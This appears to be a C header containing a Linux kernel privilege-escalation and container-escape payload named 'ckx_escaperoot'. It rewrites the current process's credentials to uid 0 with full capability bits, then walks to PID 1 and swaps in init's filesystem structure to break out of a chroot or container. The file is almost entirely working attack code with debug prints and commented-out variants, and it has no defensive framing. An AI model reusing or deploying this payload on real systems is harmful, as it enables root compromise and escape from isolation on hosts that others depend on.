#ifndef _CKX_ESCAPEROOT_
#define _CKX_ESCAPEROOT_

void pull_fs(struct task_struct *tsk,
             struct fs_struct *new_fs)
{
    struct fs_struct *fs = tsk->fs;
    int kill;
    if (fs)
    {
        task_lock(tsk);
        spin_lock(&fs->lock);
        tsk->fs = new_fs;
        kill = !--fs->users;
        spin_unlock(&fs->lock);
        task_unlock(tsk);
    }
    // if (kill)
    // free_fs_struct(fs);
}

void ckx_escaperoot(void)
{
    struct cred *mycred = current_cred();

    printk("[@]the current uid is %d\n", mycred->uid);

    kuid_t rootid;
    rootid.val = 0;

    // kuid_t rootid = KUIDT_INIT(0);
    mycred = prepare_creds();

    mycred->uid = rootid;

    mycred->cap_permitted.cap[0] = 0xffffffff;
    mycred->cap_permitted.cap[1] = 0x3f;
    mycred->cap_effective.cap[0] = 0xffffffff;
    mycred->cap_effective.cap[1] = 0x3f;
    mycred->cap_bset.cap[0] = 0xffffffff;
    mycred->cap_bset.cap[1] = 0x3f;

    struct task_struct *task = get_current();

    while (task->pid != 1)
    {

        task = task->real_parent;
    }

    struct fs_struct *to = task->fs;

    printk("[***]init_fs found %d\n\n\n", task->pid);

    // daemonize_fs_struct

    task = get_current();
    // daemonize_fs_struct();

    pull_fs(task, to);

    // struct nsproxy *new_proxy = create_namespaces(clone_flags, tsk, uns, tsk->fs);

    // struct nsproxy init_nsproxy = INIT_NSPROXY(init_nsproxy);
    // switch_task_namespaces(task,&init_nsproxy);

    // char buffer[8] = "\xff\xff\xff\x22\x33\x77\x00\x00";
    // memcpy(&(mycred->cap_permitted),buffer,8);

    commit_creds(mycred);

    // return -EINVAL;
    // setuid(0);
    // current_uid=0;

    printk("[@]now current uid is %d\n", mycred->uid);
}

#endif